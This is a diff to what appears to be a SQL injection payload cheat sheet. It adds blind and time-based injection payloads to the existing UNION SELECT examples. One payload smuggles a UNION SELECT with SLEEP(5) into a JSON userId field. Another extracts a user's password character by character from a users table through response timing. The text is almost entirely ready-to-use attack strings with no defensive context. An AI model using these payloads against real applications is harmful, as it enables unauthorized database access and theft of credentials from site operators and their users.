@@ -219,6 +219,17 @@ If order by does not work send null column names or random names, second example
 `'UNION+SELECT+NULL,NULL--`
 `'UNION+SELECT+'cc','acc'+FROM+dual--`
 
+
+Blind SQLInjection Payloads(also try first by including values after the ":
+{"userId":"1 UNION SELECT 
+CASE WHEN (target_case) THEN SLEEP(5) ELSE 0 END 
+FROM users) --",
+
+
+
+### TIme Based techniques:
+ SELECT CASE WHEN ascii(substring(password,%s,1))=[CHAR] 
+THEN SLEEP(5) ELSE 0 END from users where username=admin)--
 ### Getting table names
 
 ## In oracle based on number of columns getting table names
